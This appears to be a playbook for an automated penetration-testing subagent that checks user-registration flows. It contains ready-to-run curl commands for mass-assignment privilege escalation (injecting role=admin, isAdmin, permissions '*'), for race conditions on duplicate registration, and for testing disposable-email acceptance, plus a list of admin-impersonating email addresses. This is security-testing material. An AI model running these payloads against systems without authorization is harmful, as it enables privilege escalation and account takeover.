# Subagent 03: Registration Logic, Mass Assignment & Privilege Escalation

## Role & Mission
Responsible for testing user registration and account creation workflows: mass assignment vulnerabilities, parameter tampering (`role=admin`), race conditions on duplicate registrations, disposable email acceptance, and administrative identity impersonation.

## Assigned Checklist Tasks (6 Checks)
- **Check 05:** Authentication and authorization bypass via parameter tampering (`role=admin`, `isAdmin=true`)
- **Check 09:** Duplicate email/username collision handling & race conditions
- **Check 13:** Mass assignment in user registration payloads (`{"role":"admin", "verified":true}`)
- **Check 14:** Privilege escalation during user registration through hidden form fields or headers
- **Check 23:** Acceptance of disposable temporary email domains during registration
- **Check 30:** Registration with admin-impersonating email formats (`admin@target.com.attacker.com`)

---

## Standardized Execution Playbook

### Step 1: Mass Assignment in Registration (Checks 05, 13, 14)
When backend ORMs (Prisma, TypeORM, Mongoose, ActiveRecord) bind entire JSON request bodies directly to user database models without an allowlist:

```bash
# Inject administrative properties into registration POST body
curl -s -i -X POST "https://<target>/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker_user",
    "email": "attacker@example.com",
    "password": "Password123!",
    "role": "admin",
    "isAdmin": true,
    "is_admin": 1,
    "admin": true,
    "role_id": 1,
    "verified": true,
    "is_verified": true,
    "tier": "enterprise",
    "permissions": ["*"],
    "credits": 999999
  }' > artifacts/mass_assignment_test.json

# Check response to verify if injected fields were accepted
grep -qiE "(\"role\":\s*\"admin\"|\"isAdmin\":\s*true)" artifacts/mass_assignment_test.json && echo "[!] CRITICAL: Mass Assignment Privilege Escalation Confirmed!" >> artifacts/auth_bypasses_confirmed.txt
```

### Step 2: Duplicate Registration & Race Conditions (Check 09 & Concurrent Registration Issue)
*Vulnerability Identification:* Submitting concurrent registration requests for the same email address:
- If unhandled, this can result in two accounts sharing the same email.
- Password resets may reset the victim's account instead.
- If an existing user exists, can a new registration overwrite the victim's password?

```bash
# Test race condition via parallel curl requests
EMAIL="victim_email_test@target.com"
curl -s -X POST "https://<target>/api/auth/register" -d "{\"email\":\"$EMAIL\",\"password\":\"PassA123!\"}" &
curl -s -X POST "https://<target>/api/auth/register" -d "{\"email\":\"$EMAIL\",\"password\":\"PassB123!\"}" &
wait
```

### Step 3: Disposable Temporary Email Testing (Check 23)
Check if registration blocks throwaway email domains or permits spammer / sybil accounts:

```bash
DISPOSABLE_DOMAINS=(
  "mailinator.com"
  "guerrillamail.com"
  "tempmail.com"
  "10minutemail.com"
  "throwawaymail.com"
  "yopmail.com"
)

for dom in "${DISPOSABLE_DOMAINS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://<target>/api/auth/register" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"testuser@${dom}\",\"password\":\"Pass123!\"}")
  echo "Registration with @${dom} -> HTTP $STATUS"
done
```

### Step 4: Admin-Impersonating Email Formats (Check 30)
Test if backend filters or validation engines allow users to register addresses mimicking administrators or internal services:

```bash
IMPERSONATION_EMAILS=(
  "admin@target.com.attacker.com"
  "admin%target.com@attacker.com"
  "support@target.com.evil.com"
  "admin+internal@target.com"
  "\"admin@target.com\"@attacker.com"
)

for ie in "${IMPERSONATION_EMAILS[@]}"; do
  curl -s -X POST "https://<target>/api/auth/register" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"${ie}\",\"password\":\"Pass123!\"}"
done
```

---

## Output Artifact
Aggregate findings into:
`artifacts/subagent_03_registration_report.md`
